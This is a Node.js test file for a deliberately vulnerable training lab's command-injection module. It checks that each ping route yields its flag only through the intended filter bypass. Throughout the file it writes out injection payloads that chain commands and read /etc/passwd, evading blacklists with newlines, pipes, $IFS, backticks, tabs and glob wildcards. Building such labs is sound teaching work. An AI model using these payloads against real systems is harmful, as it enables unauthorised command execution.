'use strict';
// cmdi module: every ping gadget must be solvable by the documented filter
// bypass and must NOT be solvable by a shortcut that skips the actual bypass.
const test = require('node:test');
const assert = require('node:assert/strict');
const { client, bootLab, flagFromDb, capturedSet, FLAG_RE } = require('./helpers');

// Builds a /cmdi/<route>?host=<host> URL, percent-encoding the host so shell
// metacharacters (;, |, `, newline, tab, ?) survive the HTTP request intact.
function pingUrl(route, host) {
  return `/cmdi/${route}?host=${encodeURIComponent(host)}`;
}

test('cmdi module', async (t) => {
  const { srv, dataDir } = await bootLab(t);
  const flagOf = (id) => flagFromDb(dataDir, 'cmdi', id);

  await t.test('module page renders, links resolve, no em dash, no unstyled controls', async () => {
    const c = client(srv.base);
    const { status, text } = await c.get('/cmdi');
    assert.equal(status, 200);
    assert.ok(!text.includes('\u2014'), 'em dash in page');
    assert.ok(!/<table>/.test(text), 'unstyled table');
    assert.ok(!/<input(?![^>]*class="clay-input")/.test(text), 'unstyled input');
    assert.ok(!/<button(?![^>]*class="(clay-btn|copy-btn)")/.test(text), 'unstyled button');
    assert.equal((text.match(/class="vuln-card"/g) || []).length, 9);
    assert.equal((text.match(FLAG_RE) || []).length, 0);
    const hrefs = [...text.matchAll(/href="(\/[^"]*)"/g)].map((m) => m[1]);
    assert.ok(hrefs.includes('/cmdi/ping'));
    assert.ok(hrefs.includes('/cmdi/ping9'));
    for (const href of new Set(hrefs)) {
      const r = await c.get(href);
      assert.notEqual(r.status, 404, href);
    }
  });

  await t.test('basic: plain ping gives nothing, a chained command earns the flag', async () => {
    const c = client(srv.base);
    const plain = await c.get(pingUrl('ping', '127.0.0.1'));
    assert.equal(plain.status, 200);
    assert.ok(!plain.text.match(FLAG_RE));
    const shortcut = await c.get(pingUrl('ping', 'uid='));
    assert.ok(!shortcut.text.match(FLAG_RE), 'echoing a marker with no injection must not award');
    const hit = await c.get(pingUrl('ping', '127.0.0.1;id'));
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('basic')));
    assert.ok((await capturedSet(c)).includes('cmdi:Ping Gadget (no filtering)'));
  });

  await t.test('bypass: a filtered semicolon fails, a newline chains past the weak blacklist', async () => {
    const c = client(srv.base);
    const shortcut = await c.get(pingUrl('ping2', '127.0.0.1;id'));
    assert.ok(!shortcut.text.match(FLAG_RE), 'the semicolon is stripped, so this must not award');
    const hit = await c.get(pingUrl('ping2', '127.0.0.1\nid'));
    assert.ok(hit.text.includes(flagOf('bypass')));
  });

  await t.test('cmdi-ifs: a real space breaks the command, $IFS survives the space filter', async () => {
    const c = client(srv.base);
    const shortcut = await c.get(pingUrl('ping3', '127.0.0.1;cat /etc/passwd'));
    assert.ok(!shortcut.text.match(FLAG_RE), 'the space is stripped, so this must not award');
    const hit = await c.get(pingUrl('ping3', '127.0.0.1;cat$IFS/etc/passwd'));
    assert.ok(hit.text.includes(flagOf('cmdi-ifs')));
  });

  await t.test('cmdi-braces: bare $IFS is stripped, ${IFS} is not', async () => {
    const c = client(srv.base);
    const shortcut = await c.get(pingUrl('ping4', '127.0.0.1;cat$IFS/etc/passwd'));
    assert.ok(!shortcut.text.match(FLAG_RE), 'bare $IFS is stripped, so this must not award');
    const hit = await c.get(pingUrl('ping4', '127.0.0.1;cat${IFS}/etc/passwd'));
    assert.ok(hit.text.includes(flagOf('cmdi-braces')));
  });

  await t.test('cmdi-newline: a stripped semicolon fails, a raw newline chains commands', async () => {
    const c = client(srv.base);
    const shortcut = await c.get(pingUrl('ping5', '127.0.0.1;cat /etc/passwd'));
    assert.ok(!shortcut.text.match(FLAG_RE), 'the semicolon is stripped, so this must not award');
    const hit = await c.get(pingUrl('ping5', '127.0.0.1\ncat /etc/passwd'));
    assert.ok(hit.text.includes(flagOf('cmdi-newline')));
  });

  await t.test('cmdi-backtick: $(...) is stripped, legacy backticks still substitute', async () => {
    const c = client(srv.base);
    const shortcut = await c.get(pingUrl('ping6', '127.0.0.1;echo $(id)'));
    assert.ok(!shortcut.text.match(FLAG_RE), '$( is stripped, so this must not award');
    const hit = await c.get(pingUrl('ping6', '127.0.0.1;echo `id`'));
    assert.ok(hit.text.includes(flagOf('cmdi-backtick')));
  });

  await t.test('cmdi-wildcard: the literal words are blocked, glob wildcards rebuild them', async () => {
    const c = client(srv.base);
    const shortcut = await c.get(pingUrl('ping7', '127.0.0.1;cat /etc/passwd'));
    assert.ok(!shortcut.text.match(FLAG_RE), 'cat and / are stripped, so this must not award');
    const hit = await c.get(pingUrl('ping7', '127.0.0.1;/???/bin/?at /???/p?sswd'));
    assert.ok(hit.text.includes(flagOf('cmdi-wildcard')));
  });

  await t.test('cmdi-pipe: a stripped semicolon fails, a pipe chains without one', async () => {
    const c = client(srv.base);
    const shortcut = await c.get(pingUrl('ping8', '127.0.0.1;id'));
    assert.ok(!shortcut.text.match(FLAG_RE), 'the semicolon is stripped, so this must not award');
    const hit = await c.get(pingUrl('ping8', '127.0.0.1|id'));
    assert.ok(hit.text.includes(flagOf('cmdi-pipe')));
  });

  await t.test('cmdi-tab: a stripped space fails, a literal tab is whitespace too', async () => {
    const c = client(srv.base);
    const shortcut = await c.get(pingUrl('ping9', '127.0.0.1;cat /etc/passwd'));
    assert.ok(!shortcut.text.match(FLAG_RE), 'the space is stripped, so this must not award');
    const hit = await c.get(pingUrl('ping9', '127.0.0.1;cat\t/etc/passwd'));
    assert.ok(hit.text.includes(flagOf('cmdi-tab')));
  });

  await t.test('quoted echo of the expected output earns nothing anywhere', async () => {
    const c = client(srv.base);
    // The shell strips the quotes, so a quoted echo prints exactly the
    // evidence-shaped text a naive check looks for, with no real command run.
    const basicQ = await c.get(pingUrl('ping', '127.0.0.1;echo "uid=1000(root) gid=0(root) groups=0(root)"'));
    assert.ok(!basicQ.text.match(FLAG_RE), 'a quoted echo must not award basic');
    const pipeQ = await c.get(pingUrl('ping8', "127.0.0.1|echo 'uid=1000(root) gid=0(root)'"));
    assert.ok(!pipeQ.text.match(FLAG_RE), 'a quoted echo must not award cmdi-pipe');
    const nlQ = await c.get(pingUrl('ping5', '127.0.0.1\necho "root:x:0:0:root:/root:/bin/bash"'));
    assert.ok(!nlQ.text.match(FLAG_RE), 'a quoted echo must not award cmdi-newline');
    const printfQ = await c.get(pingUrl('ping', '127.0.0.1;printf "uid=0(root)\\n"'));
    assert.ok(!printfQ.text.match(FLAG_RE), 'a printf of the marker must not award basic');
    const tabQ = await c.get(pingUrl('ping9', '127.0.0.1;echo\t"root:x:0:0:root:/root:/bin/bash"'));
    assert.ok(!tabQ.text.match(FLAG_RE), 'a quoted echo must not award cmdi-tab');
    assert.deepEqual((await capturedSet(c)).filter((s) => s.startsWith('cmdi:')), []);
  });

  await t.test('repeating an exploit does not double count the scoreboard', async () => {
    const c = client(srv.base);
    await c.get(pingUrl('ping', '127.0.0.1;id'));
    await c.get(pingUrl('ping', '127.0.0.1;id'));
    await c.get(pingUrl('ping', '127.0.0.1;id'));
    const got = (await capturedSet(c)).filter((s) => s.startsWith('cmdi:'));
    assert.equal(got.length, 1);
  });
});
